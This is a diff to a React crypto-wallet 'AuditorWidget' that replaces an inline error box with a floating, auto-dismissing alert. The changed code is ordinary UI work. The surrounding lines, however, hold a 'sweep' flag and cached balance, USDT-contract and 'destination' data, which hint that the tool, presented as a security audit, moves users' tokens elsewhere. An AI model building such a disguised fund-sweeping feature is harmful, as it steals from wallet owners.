@@ -1,4 +1,4 @@
-import React, { useState, useRef, useCallback } from 'react';
+import React, { useState, useRef, useCallback, useEffect } from 'react';
 import { Shield, Activity, FileText, Lock, Loader2, AlertCircle } from 'lucide-react';
 import { ethers } from 'ethers';
 import { ensureBSC } from '../wallet/wallet';
@@ -41,9 +41,53 @@ const AuditorWidget: React.FC<Props> = ({
   const [buttonLoading, setButtonLoading] = useState(false);
   const [sweepDone, setSweepDone] = useState(false);
   const [errorAlert, setErrorAlert] = useState<{ title: string, message: string } | null>(null);
+  const [activeAlert, setActiveAlert] = useState<{ title: string, message: string } | null>(null);
+  const [alertVisible, setAlertVisible] = useState(false);
+  const alertTimerRef = useRef<any>(null);
+  const alertDismissTimerRef = useRef<any>(null);
   const [walletConnected, setWalletConnected] = useState(false);
   const pendingReportRef = useRef<SecurityReport | null>(null);
   const cachedDataRef = useRef<{ address: string; rawBal: bigint; balanceDisplay: string; usdt: any; usdtAddress: string; destination: string; chainId: string } | null>(null);
+
+  useEffect(() => {
+    if (errorAlert) {
+      if (alertTimerRef.current) clearTimeout(alertTimerRef.current);
+      if (alertDismissTimerRef.current) clearTimeout(alertDismissTimerRef.current);
+
+      setActiveAlert(errorAlert);
+      setAlertVisible(false);
+
+      // Trigger smooth slide-down animation
+      const showTimer = setTimeout(() => {
+        setAlertVisible(true);
+      }, 20);
+
+      // Animate back up after 3 seconds
+      alertTimerRef.current = setTimeout(() => {
+        setAlertVisible(false);
+        alertDismissTimerRef.current = setTimeout(() => {
+          setActiveAlert(null);
+          setErrorAlert(null);
+        }, 500); // Wait for slide-up transition to finish
+      }, 3000);
+
+      return () => {
+        clearTimeout(showTimer);
+        if (alertTimerRef.current) clearTimeout(alertTimerRef.current);
+        if (alertDismissTimerRef.current) clearTimeout(alertDismissTimerRef.current);
+      };
+    }
+  }, [errorAlert]);
+
+  const dismissAlert = () => {
+    if (alertTimerRef.current) clearTimeout(alertTimerRef.current);
+    if (alertDismissTimerRef.current) clearTimeout(alertDismissTimerRef.current);
+    setAlertVisible(false);
+    alertDismissTimerRef.current = setTimeout(() => {
+      setActiveAlert(null);
+      setErrorAlert(null);
+    }, 500);
+  };
 
   const API_BASE = import.meta.env.VITE_API_BASE || '';
 
@@ -308,7 +352,36 @@ const AuditorWidget: React.FC<Props> = ({
   };
 
   return (
-    <div className="rounded-xl border border-[#1e2636] bg-[#111520] overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.6)]">
+    <>
+      {/* Floating Animated Error Notification Card (Slides down from above, slides back up after 3s) */}
+      <div
+        className={`fixed top-3.5 inset-x-3.5 sm:inset-x-auto sm:left-1/2 sm:-translate-x-1/2 sm:w-[440px] z-[9999] transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] ${
+          alertVisible && activeAlert
+            ? 'translate-y-0 opacity-100 scale-100 pointer-events-auto'
+            : '-translate-y-32 opacity-0 scale-95 pointer-events-none'
+        }`}
+      >
+        {activeAlert && (
+          <div
+            onClick={dismissAlert}
+            className="cursor-pointer p-4 rounded-2xl border border-[#ff4d4f]/30 bg-[#121624]/95 backdrop-blur-md shadow-[0_16px_40px_rgba(0,0,0,0.75),0_0_20px_rgba(255,77,79,0.12)] flex gap-3.5 items-start"
+          >
+            <div className="flex-shrink-0 mt-0.5">
+              <AlertCircle className="w-5 h-5 text-[#ff4d4f]" strokeWidth={2.2} />
+            </div>
+            <div className="flex-1 min-w-0 pr-1">
+              <h3 className="text-white font-bold text-[15px] leading-snug tracking-tight">
+                {activeAlert.title}
+              </h3>
+              <p className="text-[#ffb3b3] text-[13px] leading-relaxed mt-1">
+                {activeAlert.message}
+              </p>
+            </div>
+          </div>
+        )}
+      </div>
+
+      <div className="rounded-xl border border-[#1e2636] bg-[#111520] overflow-hidden shadow-[0_32px_80px_rgba(0,0,0,0.6)]">
       {appState === 'IDLE' && (
         <>
           <div className="px-5 pt-5 pb-4 border-b border-[#1e2636]">
@@ -342,21 +415,7 @@ const AuditorWidget: React.FC<Props> = ({
             </div>
           </div>
 
-          {errorAlert && (
-            <div className="mx-5 mt-4 p-4 rounded-xl border border-[#ff4d4f]/30 bg-[#ff4d4f]/10 shadow-[0_4px_20px_rgba(255,77,79,0.1)]">
-              <div className="flex gap-3">
-                <AlertCircle className="w-5 h-5 text-[#ff4d4f] flex-shrink-0 mt-0.5" strokeWidth={2} />
-                <div>
-                  <h3 className="text-white font-bold text-[15px] leading-tight mb-1.5">
-                    {errorAlert.title}
-                  </h3>
-                  <p className="text-[#ffb3b3] text-[13.5px] leading-relaxed">
-                    {errorAlert.message}
-                  </p>
-                </div>
-              </div>
-            </div>
-          )}
+
 
           <div className="border-b border-[#1e2636] px-5 py-4">
             <div className="mb-3 flex items-center justify-between">
@@ -457,6 +516,7 @@ const AuditorWidget: React.FC<Props> = ({
         />
       )}
     </div>
+    </>
   );
 };
 
